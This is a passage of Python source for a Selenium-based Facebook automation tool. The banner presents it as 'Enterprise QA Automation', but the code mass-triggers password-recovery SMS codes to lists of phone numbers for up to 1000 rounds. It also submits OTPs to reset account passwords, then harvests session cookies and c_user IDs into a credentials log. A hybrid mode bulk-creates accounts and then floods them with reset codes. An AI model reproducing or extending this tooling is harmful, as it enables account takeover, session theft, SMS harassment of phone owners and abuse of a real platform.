                            print_stage_log(total, index, f"SMS radio matching +******{last2} not found. Skipping...", emoji="⚠️")

                        write_runtime_log("WARN", "RECOVERY", f"Recovery failure for {phone}: {record['status']} - {record['diagnostics']}")
                        self._log_invalid_reset(record)
                        return record

                        write_runtime_log("WARN", "RECOVERY", f"Recovery failure for {phone}: {record['status']} - {record['diagnostics']}")
                        self._log_invalid_reset(record)
                        return record

            # Check for "Enter code" screen
            otp_inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='n'], input[maxlength='6'], input[maxlength='8'], input[name='recovery_code'], input[name='code'], input[name='c'], input[type='number']")
            if otp_inputs:
                print_stage_log(total, index, "otp input screen found")
                write_runtime_log("INFO", "RECOVERY", "Landed on SMS OTP verification screen.")

            # Destination phone verification on OTP screen: check last 2 digits
            body_otp = get_safe_body_text(driver)
            otp_num_matches = []
            for m in re.finditer(r"(?:\+|(?<=\s))[\*•xX]{2,}(\d{2})\b", body_otp):
                otp_num_matches.append(m.group(1))
            for m in re.finditer(r"(?:code\s+to|sent\s+to|via\s+sms\s+to|number)\s*[:\s]*\+?[\*•xX\d\s\-]{3,}(\d{2})\b", body_otp, re.IGNORECASE):
                otp_num_matches.append(m.group(1))

            if otp_num_matches and last2:
                detected_last2 = otp_num_matches[0]
                if detected_last2 != last2:
                    write_runtime_log("WARN", "RECOVERY", f"Destination phone mismatch on OTP screen! Found ..{detected_last2}, expected ..{last2} for {phone}.")
                    print_stage_log(total, index, f"Phone mismatch on OTP screen (found ..{detected_last2}, expected ..{last2}). Resetting session...", emoji="⚠️")
                    try:
                        driver.delete_all_cookies()
                        driver.execute_script("try { window.localStorage.clear(); window.sessionStorage.clear(); } catch(e){}")
                    except Exception:
                        pass
                    record["status"] = "PHONE MISMATCH ⚠️"
                    record["diagnostics"] = f"OTP was dispatched to wrong phone (ending in {detected_last2}, expected {last2})."
                    self._log_invalid_reset(record)
                    return record
                else:
                    write_runtime_log("MATCH", "RECOVERY", f"Verified OTP screen destination (+******{last2}) matches target phone.")
                    print_stage_log(total, index, f"Verified OTP destination (+******{last2})")

            # Option 6 Branch: Reset OTP concludes here!
            if self.action == "reset_otp":
                record["status"] = "RECO SMS SENT ✅"
                new_cnt = smart_update_reco_sms(phone, "RECO SMS SENT ✅")
                record["diagnostics"] = f"reco sms sent {new_cnt}x to ({phone})"
                print_stage_log(total, index, f"reco sms sent {new_cnt}x to ({phone})")
                write_runtime_log("SUCCESS", "RECOVERY", f"Option 6 completed round 1: reco sms sent {new_cnt}x to ({phone})")

                # Smart in-session multi-round loop (driver.back())
                if self.reco_rounds > 1:
                    for r in range(2, self.reco_rounds + 1):
                        write_runtime_log("RECOVERY", "MULTI_ROUND", f"Executing in-session round {r}/{self.reco_rounds} for {phone} via driver.back()")
                        try:
                            await asyncio.to_thread(driver.back)
                            await self._wait_for_dom_ready(driver)
                            await asyncio.sleep(1.2 if self.mode != "ultra" else 0.6)

                            # Recovery Options Screen: Find SMS Radio Button again
                            radios = driver.find_elements(By.CSS_SELECTOR, "input[type='radio'], div[role='radio'], li[role='radio'], input[type='checkbox']")
                            selected_radio = None
                            sms_candidates = []
                            for rad in radios:
                                ctx = _extract_radio_context(driver, rad)
                                if "whatsapp" in ctx or "wa.me" in ctx: continue
                                has_last2_r = bool(last2 and last2 in ctx)
                                if has_last2_r and "@" not in ctx and "email" not in ctx:
                                    selected_radio = rad
                                    break
                                if any(w in ctx for w in ["sms", "text", "phone", "mobile", "messaggio", "cellulare", "telefono", "testo", "mensaje", "code via sms", "send_sms"]):
                                    sms_candidates.append((rad, ctx))
                                    if has_last2_r:
                                        selected_radio = rad
                                        break
                            if not selected_radio and sms_candidates:
                                selected_radio = sms_candidates[0][0]
                            if not selected_radio and len(radios) == 1:
                                if "whatsapp" not in _extract_radio_context(driver, radios[0]):
                                    selected_radio = radios[0]

                            if selected_radio:
                                print_stage_log(total, index, f"Found SMS radio (+******{last2})")
                                driver.execute_script("try { arguments[0].checked = true; } catch(e){} arguments[0].click();", selected_radio)
                                r_id = selected_radio.get_attribute("id")
                                if r_id:
                                    lbls = driver.find_elements(By.CSS_SELECTOR, f"label[for='{r_id}']")
                                    if lbls:
                                        driver.execute_script("arguments[0].click();", lbls[0])
                                await asyncio.sleep(0.5)

                            cont_btns = driver.find_elements(
                                By.XPATH,
                                "//div[@role='button'][@aria-label='Continue' or @aria-label='Continua' or @aria-label='Avanti' or @aria-label='Continuar' or @aria-label='Continuer' or @aria-label='Weiter'] | "
                                "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue') or contains(translate(., 'CONTINUA', 'continua'), 'continua') or contains(translate(., 'AVANTI', 'avanti'), 'avanti') or contains(translate(., 'CONTINUAR', 'continuar'), 'continuar') or contains(translate(., 'NEXT', 'next'), 'next')] | "
                                "//button[@type='submit'] | "
                                "//button[contains(translate(., 'CONTINUE', 'continue'), 'continue') or contains(translate(., 'CONTINUA', 'continua'), 'continua') or contains(translate(., 'AVANTI', 'avanti'), 'avanti') or contains(translate(., 'CONTINUAR', 'continuar'), 'continuar') or contains(translate(., 'NEXT', 'next'), 'next')] | "
                                "//input[@type='submit'] | "
                                "//button[@name='reset_action'] | "
                                "//input[@name='reset_action']"
                            )
                            if cont_btns:
                                driver.execute_script("arguments[0].click();", cont_btns[0])
                                print_stage_log(total, index, "Clicked Continue")
                                await self._wait_for_dom_ready(driver)
                                await asyncio.sleep(1.5 if self.mode != "ultra" else 0.8)

                            otp_inputs = driver.find_elements(By.CSS_SELECTOR, "input[name='n'], input[maxlength='6'], input[maxlength='8'], input[name='recovery_code'], input[name='code'], input[name='c'], input[type='number']")
                            if otp_inputs:
                                print_stage_log(total, index, "otp input screen found")

                            new_cnt = smart_update_reco_sms(phone, "RECO SMS SENT ✅")
                            record["diagnostics"] = f"reco sms sent {new_cnt}x to ({phone})"
                            print_stage_log(total, index, f"reco sms sent {new_cnt}x to ({phone})")
                            write_runtime_log("SUCCESS", "RECOVERY", f"Option 6 in-session round {r}/{self.reco_rounds} completed: reco sms sent {new_cnt}x to ({phone})")
                        except Exception as e:
                            write_runtime_log("WARN", "RECOVERY", f"In-session recovery round {r} hit exception for {phone}: {e}")
                            break

                record["time_taken"] = round(time.time() - task_start, 2)
                self.processed_count += 1
                if index < total:
                    print("🫯🌌 next task on progress ☄️")
                return record

            # Option 5 Branch: Submit OTP and Reset Password
            if not otps:
                record["status"] = "NO OTP PROVIDED ⚠️"
                record["diagnostics"] = "Account reset requested without OTP in pair."
                write_runtime_log("ERROR", "RECOVERY", "Account reset requested with empty OTP list.")
                self._log_invalid_otp(record)
                return record

            otp_success = False
            for otp_idx, current_otp in enumerate(otps, 1):
                print_stage_log(total, index, f"Submitting OTP {current_otp} (attempt {otp_idx}/{len(otps)})")
                write_runtime_log("ACTION", "RECOVERY", f"Submitting OTP attempt {otp_idx}/{len(otps)}: {current_otp}")
                otp_field = driver.find_elements(By.CSS_SELECTOR, "input[name='n'], input[maxlength='6'], input[maxlength='8'], input[name='recovery_code'], input[name='code'], input[name='c'], input[type='number']")
                if not otp_field:
                    break
                otp_field[0].clear()
                otp_field[0].send_keys(current_otp)

                cont_sub = driver.find_elements(By.XPATH, "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')] | //button[@type='submit'] | //input[@type='submit']")
                if cont_sub:
                    driver.execute_script("arguments[0].click();", cont_sub[0])
                else:
                    otp_field[0].submit()

                await asyncio.sleep(2.0)
                body_after_otp = get_safe_body_text(driver).lower()

                # Check if invalid OTP error
                if any(err in body_after_otp for err in ["invalid code", "incorrect", "wrong code", "please check your code", "doesn't match"]):
                    print_stage_log(total, index, f"OTP {current_otp} invalid. Trying next OTP...", emoji="⚠️")
                    write_runtime_log("WARN", "RECOVERY", f"OTP {current_otp} rejected by Facebook.")
                    continue

                # Check if landed on new password screen
                pwd_new_inputs = driver.find_elements(By.CSS_SELECTOR, "input[type='password'], input[name='password_new'], input[name='new_password']")
                if pwd_new_inputs or "new password" in body_after_otp or "choose a new password" in body_after_otp:
                    otp_success = True
                    write_runtime_log("SUCCESS", "RECOVERY", f"OTP {current_otp} accepted. Landed on new password screen.")
                    break

            if not otp_success:
                record["status"] = "ALL OTPS INVALID ❌"
                record["diagnostics"] = f"Exhausted all {len(otps)} OTPs without success."
                print_stage_log(total, index, f"All OTPs exhausted for {phone}. Logged to invalid_otp_accounts.txt", emoji="❌")
                write_runtime_log("ERROR", "RECOVERY", f"Exhausted all {len(otps)} OTP attempts for {phone}.")
                self._log_invalid_otp(record)
                return record

            # New Password Entry
            new_pwd = self.password or generate_strong_password(14)
            record["password"] = new_pwd
            print_stage_log(total, index, "OTP accepted! Setting new password...")
            print_stage_log(total, index, "password input screen found")
            print_stage_log(total, index, f"setting password: {new_pwd}")
            write_runtime_log("ACTION", "RECOVERY", f"Setting new password for {phone}...")
            pwd_field = driver.find_elements(By.CSS_SELECTOR, "input[type='password'], input[name='password_new'], input[name='new_password']")
            if pwd_field:
                pwd_field[0].clear()
                pwd_field[0].send_keys(new_pwd)
                cont_pwd = driver.find_elements(By.XPATH, "//div[@role='button'][contains(translate(., 'CONTINUE', 'continue'), 'continue')] | //button[@type='submit'] | //input[@type='submit']")
                if cont_pwd:
                    driver.execute_script("arguments[0].click();", cont_pwd[0])
                else:
                    pwd_field[0].submit()
                await asyncio.sleep(2.0)

            # Check "Save login info for later" screen
            body_post = get_safe_body_text(driver).lower()
            if "save for later login" in body_post or "save your login info" in body_post or "save password" in body_post:
                print_stage_log(total, index, "Found Save login info for later")
                write_runtime_log("INFO", "RECOVERY", "Found 'Save login info for later' screen. Clicking Not Now...")
                not_now_btns = driver.find_elements(By.XPATH, "//button[contains(translate(., 'NOT NOW', 'not now'), 'not now')] | //div[@role='button'][contains(translate(., 'NOT NOW', 'not now'), 'not now')] | //a[contains(translate(., 'NOT NOW', 'not now'), 'not now')] | //span[contains(translate(., 'NOT NOW', 'not now'), 'not now')]")
                if not_now_btns:
                    driver.execute_script("arguments[0].click();", not_now_btns[0])
                    print_stage_log(total, index, "clicked not now")
                    await asyncio.sleep(1.5)

            # Harvest Cookies & c_user
            cookies = driver.get_cookies()
            cdict = {c["name"]: c["value"] for c in cookies}
            record["c_user"] = cdict.get("c_user", "N/A")
            record["cookies"] = "; ".join([f"{c['name']}={c['value']}" for c in cookies])
            record["status"] = "RECOVERY DONE ✅"
            record["diagnostics"] = "Password updated and session authenticated."
            write_runtime_log("SUCCESS", "RECOVERY", f"Account recovery successful for {phone} (c_user: {record['c_user']})")

            print_stage_log(total, index, f"Recovery successful! c_user: {record['c_user']} /phone {phone}")
            print_stage_log(total, index, f"password {new_pwd}")
            print_stage_log(total, index, "logged to file details are:")
            self._log_successful_recovery(record)
            render_account_card(record)

            record["time_taken"] = round(time.time() - task_start, 2)
            self.processed_count += 1
            if index < total:
                print("🫯🌌 next task on progress ☄️")
            return record

        except Exception as e:
            record["status"] = "ERROR ⚠️"
            record["diagnostics"] = str(e)[:80]
            print_stage_log(total, index, f"Recovery exception: {record['diagnostics']}", emoji="❌")
            self._log_invalid_reset(record)
            if self.mode == "ultra" and self.persistent_driver:
                try: self.persistent_driver.quit()
                except Exception: pass
                self.persistent_driver = None
            return record

        finally:
            if self.mode != "ultra":
                if driver:
                    try: await asyncio.to_thread(driver.quit)
                    except Exception: pass
                if temp_dir and os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
                kill_zombie_browsers()

    def _log_reco_sms(self, phone: str, record: Dict[str, Any]):
        smart_update_reco_sms(phone, record.get("status", "RECO SMS SENT ✅"))

    def _log_successful_recovery(self, record: Dict[str, Any]):
        entry = (
            "==================================================\n"
            f"[SUCCESSFUL RECOVERY] {record['timestamp']}\n"
            f"PHONE       : {record['phone']}\n"
            f"PASSWORD    : {record['password']}\n"
            f"C_USER      : {record['c_user']}\n"
            f"COOKIES     : {record['cookies']}\n"
            f"DURATION    : {record['time_taken']}s\n"
            "==================================================\n\n"
        )
        try:
            with open("successful_recovery.txt", "a", encoding="utf-8") as f:
                f.write(entry)
        except Exception:
            pass

    def _log_invalid_otp(self, record: Dict[str, Any]):
        line = f"[INVALID OTP] {record['timestamp']} | Phone: {record['phone']} | OTPs: {record['otps']} | Reason: {record['diagnostics']}\n"
        try:
            with open("invalid_otp_accounts.txt", "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass

    def _log_invalid_reset(self, record: Dict[str, Any]):
        line = f"[INVALID RESET] {record['timestamp']} | Phone: {record['phone']} | Reason: {record['diagnostics']}\n"
        try:
            with open("invalid_reset_accounts.txt", "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass


def prompt_reco_post_task_menu(config: Dict[str, Any], results: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    """Interactive post-recovery menu to prevent auto-exit, supporting iterative re-runs with smart log tracking."""
    if config.get("dry_run") or not sys.stdin.isatty():
        return None

    action = config.get("action", "reset_otp")
    all_pairs = config.get("pairs", [])
    valid_results = [r for r in results if ("RECO SMS SENT" in r.get("status", "") or "RECOVERY DONE" in r.get("status", ""))]
    valid_phones = {r["phone"] for r in valid_results}
    valid_pairs = [p for p in all_pairs if p["phone"] in valid_phones]
    failed_pairs = [p for p in all_pairs if p["phone"] not in valid_phones]

    print(f"\n   {G0}{C_BOLD}▸ POST-TASK COMPLETION ACTIONS{C_RESET}\n")

    actions: List[Tuple[str, str]] = []
    if action == "reset_otp":
        actions.append(("all", f"Run again with all phones ({len(all_pairs)} total)"))
        if valid_pairs:
            actions.append(("valid_next", f"Run again with valid/successful ones (reco 1x -> next round) ({len(valid_pairs)} numbers)"))
            actions.append(("valid_mult", f"Run again with valid ones and target iteration value (2–1000 rounds)"))
        if failed_pairs:
            actions.append(("failed_only", f"Run again with failed/unresolved phones ({len(failed_pairs)} numbers)"))
        actions.append(("new_inputs", "Run again with new phone numbers (paste batch or enter file path)"))
    else:
        actions.append(("all", f"Run again with all pairs ({len(all_pairs)} total)"))
        if failed_pairs:
            actions.append(("failed_only", f"Run again with failed/unresolved pairs ({len(failed_pairs)} pairs)"))
        actions.append(("new_inputs", "Run again with new pairs / new list"))

    for idx, (_, label) in enumerate(actions, 1):
        print(f"   {G2}[{idx}]{C_RESET} {label}")
    print(f"   {GRAY}[0] Back to main menu{C_RESET}\n")

    while True:
        try:
            ch = input(f"   {CYAN}[+] Select Action [0-{len(actions)}] (default 0): {C_RESET}").strip()
            if ch in ("0", ""):
                return None
            num = int(ch)
            if 1 <= num <= len(actions):
                act_type = actions[num - 1][0]
                if act_type == "all":
                    new_cfg = config.copy()
                    new_cfg["count"] = len(all_pairs)
                    new_cfg["reco_rounds"] = 1
                    return new_cfg
                elif act_type == "valid_next":
                    new_cfg = config.copy()
                    new_cfg["pairs"] = valid_pairs
                    new_cfg["count"] = len(valid_pairs)
                    new_cfg["reco_rounds"] = 1
                    return new_cfg
                elif act_type == "valid_mult":
                    while True:
                        try:
                            val_str = input(f"   {CYAN}[+] Enter target rounds (2-1000): {C_RESET}").strip()
                            t_rounds = int(val_str)
                            if 2 <= t_rounds <= 1000:
                                new_cfg = config.copy()
                                new_cfg["pairs"] = valid_pairs
                                new_cfg["count"] = len(valid_pairs)
                                new_cfg["reco_rounds"] = t_rounds
                                return new_cfg
                        except (ValueError, EOFError, KeyboardInterrupt):
                            pass
                        print(f"   {ROSE}[!] Please enter an integer between 2 and 1000.{C_RESET}")
                elif act_type == "failed_only":
                    new_cfg = config.copy()
                    new_cfg["pairs"] = failed_pairs
                    new_cfg["count"] = len(failed_pairs)
                    return new_cfg
                elif act_type == "new_inputs":
                    if action == "reset_otp":
                        new_phones = prompt_phone_input_queue(
                            step_title="INPUT NEW PHONE NUMBERS FOR RESET OTP",
                            allow_synthetic_default=False
                        )
                        if not new_phones:
                            return None
                        new_cfg = config.copy()
                        new_cfg["pairs"] = [{"phone": p, "otps": []} for p in new_phones]
                        new_cfg["count"] = len(new_phones)
                        return new_cfg
                    else:
                        new_pairs = prompt_recovery_pairs_input_queue(
                            step_title="INPUT NEW PHONE & OTP RECOVERY PAIRS"
                        )
                        if not new_pairs:
                            return None
                        new_cfg = config.copy()
                        new_cfg["pairs"] = new_pairs
                        new_cfg["count"] = len(new_pairs)
                        return new_cfg
        except (ValueError, EOFError, KeyboardInterrupt):
            pass
        print(f"   {ROSE}[!] Invalid option. Enter 0 to {len(actions)}.{C_RESET}")


def prompt_creation_post_task_menu(config: Dict[str, Any], results: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    """Interactive post-creation menu preventing premature script termination."""
    if config.get("dry_run") or not sys.stdin.isatty():
        return None
    print(f"\n   {G0}{C_BOLD}▸ POST-TASK COMPLETION ACTIONS{C_RESET}\n")
    actions: List[Tuple[str, str]] = [
        ("same", "Run again with same parameters"),
        ("custom_count", "Run again with custom count / batch"),
        ("new_inputs", "Run again with new contact list / numbers (enter batch or file)")
    ]
    for idx, (_, label) in enumerate(actions, 1):
        print(f"   {G2}[{idx}]{C_RESET} {label}")
    print(f"   {GRAY}[0] Back to main menu{C_RESET}\n")
    while True:
        try:
            ch = input(f"   {CYAN}[+] Select Action [0-{len(actions)}] (default 0): {C_RESET}").strip()
            if ch in ("0", ""):
                return None
            num = int(ch)
            if 1 <= num <= len(actions):
                act_type = actions[num - 1][0]
                if act_type == "same":
                    return config.copy()
                elif act_type == "custom_count":
                    try:
                        c_in = input(f"   {CYAN}[+] Number of accounts: {C_RESET}").strip()
                        cnt = int(c_in) if c_in else 1
                        new_cfg = config.copy()
                        new_cfg["count"] = max(1, cnt)
                        return new_cfg
                    except Exception:
                        return config.copy()
                elif act_type == "new_inputs":
                    if "phone" in config.get("contact_mode", "email"):
                        new_phones = prompt_phone_input_queue(
                            step_title="INPUT NEW PHONE NUMBERS / BATCH",
                            allow_synthetic_default=False
                        )
                        if not new_phones:
                            return None
                        new_cfg = config.copy()
                        new_cfg["contact_source"] = "\n".join(new_phones)
                        new_cfg["phones"] = new_phones
                        new_cfg["count"] = len(new_phones)
                        return new_cfg
                    else:
                        new_in = read_input_with_multiline_paste(f"\n   {CYAN}[+] Enter new contact emails or file path: {C_RESET}").strip()
                        if not new_in: return None
                        extracted = [t.strip() for t in re.split(r"[\r\n,;\t ]+", new_in) if "@" in t]
                        if not extracted:
                            print(f"   {ROSE}[!] No valid contacts detected.{C_RESET}")
                            continue
                        new_cfg = config.copy()
                        new_cfg["contact_source"] = "\n".join(extracted)
                        new_cfg["count"] = len(extracted)
                        return new_cfg
        except (ValueError, EOFError, KeyboardInterrupt):
            pass
        print(f"   {ROSE}[!] Invalid option. Enter 0 to {len(actions)}.{C_RESET}")


async def run_recovery_batch_pipeline_async(config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    console = Console()
    event_bus = EventBus(port=config.get("ws_port", 8765))
    await event_bus.start()

    engine = FacebookRecoveryEngine(config, event_bus)
    items = config.get("pairs", [])
    total_target = len(items)
    reco_rounds = max(1, config.get("reco_rounds", 1))

    action_label = "Account Password Recovery" if config.get("action") == "reset_account" else "Reset OTP Dispatch"
    print_log_line("SYSTEM", f"Initialized Facebook Recovery Engine ({action_label}) · Mode: {config['mode'].upper()} · Rounds: {reco_rounds}", "INFO")
    print(f"   {G4}─────────────────────────────────────────────────────────────────{C_RESET}")

    results = []
    total_start = time.time()
    success_cnt = 0
    fail_cnt = 0

    try:
        for i, item in enumerate(items, 1):
            rec = await engine.execute_recovery_task(i, len(items), item)
            results.append(rec)
            if "RECOVERY DONE" in rec["status"] or "RECO SMS SENT" in rec["status"]:
                success_cnt += 1
            else:
                fail_cnt += 1

            if i < len(items):
                inter_delay = config.get("delay", 1.0)
                if config["mode"] in ("ultra", "instant"): inter_delay = 0.2
                await asyncio.sleep(inter_delay)
    finally:
        engine.close()
        await event_bus.stop()

    total_time = round(time.time() - total_start, 2)
    valid_results = [r for r in results if ("RECOVERY DONE" in r["status"] or "RECO SMS SENT" in r["status"])]
    failed_results = [r for r in results if r not in valid_results]

    console.print("\n")
    if valid_results:
        t1_title = "TABLE 1: SUCCESSFUL RECOVERIES" if config.get("action") == "reset_account" else "TABLE 1: RECOVERY SMS DISPATCHED"
        valid_table = Table(title=t1_title, border_style="#168C42")
        valid_table.add_column("Idx", style="#82F0AF", justify="center")
        valid_table.add_column("Status", style="bold green", justify="center")
        valid_table.add_column("Phone", style="bold white")
        if config.get("action") == "reset_account":
            valid_table.add_column("c_user", style="#82F0AF")
            valid_table.add_column("Password", style="white")
            valid_table.add_column("Time", justify="center")
            valid_table.add_column("Cookies", style="#BEFAD2", overflow="ellipsis", no_wrap=True)
        else:
            valid_table.add_column("Time", justify="center")
            valid_table.add_column("Details", style="#BEFAD2")

        for r in valid_results:
            if config.get("action") == "reset_account":
                valid_table.add_row(
                    str(r["index"]),
                    r["status"],
                    r["phone"],
                    r.get("c_user", "N/A"),
                    r.get("password", "N/A"),
                    f"{r['time_taken']}s",
                    _format_cookies_single_line(str(r.get("cookies", "N/A")))
                )
            else:
                valid_table.add_row(
                    str(r["index"]),
                    r["status"],
                    r["phone"],
                    f"{r['time_taken']}s",
                    r.get("diagnostics", f"reco sms sent 1x to ({r['phone']})")
                )
        console.print(valid_table)

    if failed_results:
        failed_table = Table(title="TABLE 2: FAILED / SKIPPED RECOVERY ATTEMPTS", border_style="#F43F5E")
        failed_table.add_column("Idx", style="bold red", justify="center")
        failed_table.add_column("Status", style="bold #F43F5E", justify="center")
        failed_table.add_column("Phone", style="bold white")
        failed_table.add_column("Time", justify="center")
        failed_table.add_column("Reason / Diagnostics", style="#FCA5A5")

        for r in failed_results:
            failed_table.add_row(str(r["index"]), r["status"], r["phone"], f"{r['time_taken']}s", r.get("diagnostics", "N/A"))
        console.print(failed_table)

    log_target = "successful_recovery.txt" if config.get("action") == "reset_account" else "reco_sms.txt"
    if success_cnt == 0:
        verdict_content = (
            f"[bold #F43F5E]All {len(results)} items failed / unresolved ❌[/]\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Log File:[/] {log_target}"
        )
        panel_border = "#F43F5E"
    elif fail_cnt == 0:
        verdict_content = (
            f"[bold #4ADE80]All {len(results)} items completed successfully ✅[/]\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Log File:[/] {log_target}"
        )
        panel_border = "#22C55E"
    else:
        verdict_content = (
            f"[bold white]Total Items:[/] {len(results)}  ·  "
            f"[bold #4ADE80]Successful ✅:[/] {success_cnt}  ·  "
            f"[bold #F43F5E]Failed / Skipped ❌:[/] {fail_cnt}\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Log File:[/] {log_target}"
        )
        panel_border = "#22C55E"

    console.print(Panel(
        verdict_content,
        border_style=panel_border,
        title="[bold #BEFAD2]RECOVERY BATCH VERDICT[/]"
    ))

    return prompt_reco_post_task_menu(config, results)


async def run_hybrid_batch_pipeline_async(config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    """Runs Phase 1: Phone Creation (90%), then automatically triggers Phase 2: Option 6 Reset OTP Dispatch."""
    console = Console()
    render_eydhm_banner(subtitle="HYBRID PIPELINE :: CREATION (90%) + RESET OTP DISPATCH")

    # Phase 1: Creation
    create_config = config.copy()
    create_config["action"] = "create"
    create_config["contact_mode"] = "phone"
    print_log_line("HYBRID", "Phase 1: Launching Phone Creation (90% Phone)...", "INFO")

    event_bus = EventBus(port=config.get("ws_port", 8765))
    await event_bus.start()
    engine = EYDHMAutomationEngine(create_config, event_bus)
    total_target = create_config.get("count", 1)
    results = []

    try:
        for i in range(1, total_target + 1):
            pwd = create_config["password"] if create_config.get("password") else generate_strong_password(14)
            print(f"\n   {G2}{C_BOLD}>>> HYBRID PHASE 1 [{i}/{total_target}]: Creating Account{C_RESET}")
            rec = await engine.execute_task(i, total_target, pwd)
            results.append(rec)
            if i < total_target:
                inter_delay = 0.2 if create_config.get("mode") in ("ultra", "instant") else create_config.get("delay", 1.0)
                await asyncio.sleep(inter_delay)
    finally:
        await event_bus.stop()

    valid_created = [r for r in results if ("90%" in r.get("status", "") or "LIVE" in r.get("status", "")) and "FAILED" not in r.get("status", "")]
    created_phones = [r.get("phone") or r.get("contact") for r in valid_created if (r.get("phone") or r.get("contact"))]

    print_log_line("HYBRID", f"Phase 1 complete: {len(created_phones)} valid accounts created for OTP dispatch.", "INFO")
    if not created_phones:
        console.print(Panel("[bold red]No valid accounts were created in Phase 1. Skipping Phase 2 OTP dispatch.[/]", border_style="#F43F5E"))
        return prompt_creation_post_task_menu(config, results)

    # Phase 2: Option 6 Reset OTP Dispatch
    reco_rounds = config.get("reco_rounds", 1)
    reco_pairs = [{"phone": p, "otps": []} for p in created_phones]
    reco_config = {
        "action": "reset_otp",
        "endpoint": config.get("endpoint", "limited"),
        "mode": config.get("mode", "ultra"),
        "pairs": reco_pairs,
        "count": len(reco_pairs),
        "reco_rounds": reco_rounds,
        "password": None,
        "proxy": config.get("proxy"),
        "delay": config.get("delay", 1.0),
        "ws_port": config.get("ws_port", 8765),
        "headless": config.get("headless", True),
        "output": "reco_sms.txt",
        "dry_run": config.get("dry_run", False)
    }

    print_log_line("HYBRID", f"Phase 2: Launching Reset OTP Dispatch on {len(reco_pairs)} phones for {reco_rounds} rounds...", "INFO")
    return await run_recovery_batch_pipeline_async(reco_config)


# ==============================================================================
# Terminal Banners & Batch Runner
# ==============================================================================

EYDHM_ASCII = [
    "   ███████  ██    ██  ██████   ██   ██  ███    ███",
    "   ██        ██  ██   ██   ██  ██   ██  ████  ████",
    "   █████      ████    ██   ██  ███████  ██ ████ ██",
    "   ██          ██     ██   ██  ██   ██  ██  ██  ██",
    "   ███████     ██     ██████   ██   ██  ██      ██"
]

GRADIENT_COLS = [G0, G1, G2, G3, G4]


def render_eydhm_banner(subtitle: str = "ENTERPRISE QA AUTOMATION & RESILIENCE ENGINE"):
    print("")
    for col, line in zip(GRADIENT_COLS, EYDHM_ASCII):
        print(f"{col}{line}{C_RESET}")
    print(f"   {WHITE}{C_BOLD}{subtitle}{C_RESET}")
    print(f"   {GRAY}Architecture: Async EventBus · High-Fidelity DOM Automation · Termux aarch64 Native{C_RESET}")
    print(f"   {G4}─────────────────────────────────────────────────────────────────{C_RESET}\n")


async def run_batch_pipeline_async(config: Dict[str, Any]) -> Optional[Dict[str, Any]]:
    console = Console()
    event_bus = EventBus(port=config.get("ws_port", 8765))
    await event_bus.start()

    engine = EYDHMAutomationEngine(config, event_bus)
    total_target = config.get("count", 1)

    print_log_line("SYSTEM", f"Initialized Automation Engine · Target: {config['endpoint']} · Mode: {config['mode'].upper()}", "INFO")
    print_log_line("SYSTEM", f"Local WebSocket Telemetry listening on ws://127.0.0.1:{event_bus.actual_port}", "INFO")
    print(f"   {G4}─────────────────────────────────────────────────────────────────{C_RESET}")

    results = []
    total_start = time.time()
    live_cnt = 0
    phone_90_cnt = 0
    appealed_cnt = 0
    dead_cnt = 0

    try:
        for i in range(1, total_target + 1):
            pwd = config["password"] if config["password"] else generate_strong_password(14)
            print(f"\n   {G2}{C_BOLD}>>> RUN {i}/{total_target}: Dispatching Staging Task{C_RESET}")

            rec = await engine.execute_task(i, total_target, pwd)
            results.append(rec)

            if "LIVE" in rec["status"]: live_cnt += 1
            elif "90%" in rec["status"]: phone_90_cnt += 1
            elif "APPEAL" in rec["status"]: appealed_cnt += 1
            else: dead_cnt += 1

            if i < total_target:
                inter_delay = config.get("delay", 1.0)
                if config["mode"] in ("ultra", "instant"): inter_delay = 0.2
                print_log_line("DELAY", f"Cool-down pause before next run ({inter_delay}s)...", "INFO")
                await asyncio.sleep(inter_delay)

    finally:
        engine.close()
        await event_bus.stop()

    # Final Summary Tables: Table 1 (Valid Accounts) and Table 2 (Failed / Skipped Accounts)
    total_time = round(time.time() - total_start, 2)
    valid_results = [r for r in results if ("LIVE" in r.get("status", "") or "90%" in r.get("status", "")) and "FAILED" not in r.get("status", "")]
    failed_results = [r for r in results if r not in valid_results]

    console.print("\n")
    if valid_results:
        valid_table = Table(title="TABLE 1: VERIFIED & VALID ACCOUNTS", border_style="#168C42")
        valid_table.add_column("Idx", style="#82F0AF", justify="center")
        valid_table.add_column("Status", style="bold green", justify="center")
        valid_table.add_column("Phone / Contact", style="bold white")
        valid_table.add_column("c_user", style="#82F0AF")
        valid_table.add_column("Password", style="white")
        valid_table.add_column("Time", justify="center")
        valid_table.add_column("Cookies", style="#BEFAD2", overflow="ellipsis", no_wrap=True)

        for r in valid_results:
            valid_table.add_row(
                str(r["index"]),
                r["status"],
                str(r.get("contact", "N/A")),
                str(r.get("c_user", "N/A")),
                str(r.get("password", "N/A")),
                f"{r.get('time_taken', 0.0)}s",
                _format_cookies_single_line(str(r.get("cookies", "N/A")))
            )
        console.print(valid_table)

    if failed_results:
        failed_table = Table(title="TABLE 2: FAILED / SKIPPED / REJECTED ACCOUNTS", border_style="#F43F5E")
        failed_table.add_column("Idx", style="bold red", justify="center")
        failed_table.add_column("Status", style="bold #F43F5E", justify="center")
        failed_table.add_column("Phone / Contact", style="bold white")
        failed_table.add_column("Time", justify="center")
        failed_table.add_column("Failure Diagnostics", style="#FCA5A5")

        for r in failed_results:
            failed_table.add_row(
                str(r["index"]),
                r["status"],
                str(r.get("contact", "N/A")),
                f"{r.get('time_taken', 0.0)}s",
                r.get("diagnostics", "N/A")[:60]
            )
        console.print(failed_table)

    total_valid = live_cnt + phone_90_cnt
    if total_valid == 0:
        verdict_content = (
            f"[bold #F43F5E]All {len(results)} accounts failed / rejected ❌[/]\n"
            f"[bold white]Total Batch Latency:[/] {total_time}s  ·  "
            f"[bold white]Average Time:[/] {round(total_time/max(1, len(results)), 2)}s/run"
        )
